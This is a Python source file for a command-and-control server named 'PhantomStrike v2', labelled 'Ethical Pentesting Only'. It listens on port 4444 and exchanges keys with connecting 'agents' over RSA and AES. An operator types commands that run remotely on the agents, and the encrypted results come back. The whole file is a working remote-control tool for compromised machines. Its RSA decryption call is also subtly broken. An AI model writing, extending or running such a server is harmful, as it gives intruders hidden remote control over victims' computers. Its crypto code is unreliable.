#!/usr/bin/env python3
"""
PhantomStrike v2 - C2 Server
Ethical Pentesting Only
Author: Akkaiaj | Fixed by Grok
"""

import socket
import threading
import json
import base64
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from datetime import datetime

# === RSA Key Pair ===
key = RSA.generate(2048)
private_key = key
public_key = key.publickey()

# === Active Agents ===
agents = {}
agent_lock = threading.Lock()

# === Encryption ===
def encrypt_aes(key, message):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(message.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

def decrypt_aes(key, data):
    raw = base64.b64decode(data)
    nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

# === Handle Agent ===
def handle_agent(conn, addr):
    agent_id = None
    aes_key = None

    try:
        # Step 1: Receive RSA-encrypted AES key
        enc_key = conn.recv(4096)
        aes_key = private_key.decrypt(enc_key)
        agent_id = f"{addr[0]}_{int(time.time())}"
        
        with agent_lock:
            agents[agent_id] = {"conn": conn, "addr": addr, "last_seen": time.time(), "aes": aes_key}
        
        print(f"[+] Agent {agent_id} connected from {addr}")

        # Step 2: Command loop
        while True:
            cmd = input(f"[{agent_id}] phantom> ").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if not cmd:
                continue

            enc_cmd = encrypt_aes(aes_key, cmd)
            conn.send(enc_cmd.encode())

            if cmd.lower() == "exit":
                break

            # Receive result
            try:
                enc_result = conn.recv(8192).decode()
                result = decrypt_aes(aes_key, enc_result)
                print(f"\n{result}\n")
            except:
                print("[-] No response.")
                break

    except Exception as e:
        print(f"[-] Agent error: {e}")
    finally:
        if agent_id and agent_id in agents:
            with agent_lock:
                del agents[agent_id]
        conn.close()
        print(f"[-] Agent {agent_id or addr} disconnected.")

# === Start Server ===
def start_server(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] PhantomStrike C2 listening on {host}:{port}")
    print(f"[*] Public Key (send to agent):\n{public_key.export_key().decode()}\n")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_agent, args=(conn, addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    start_server()
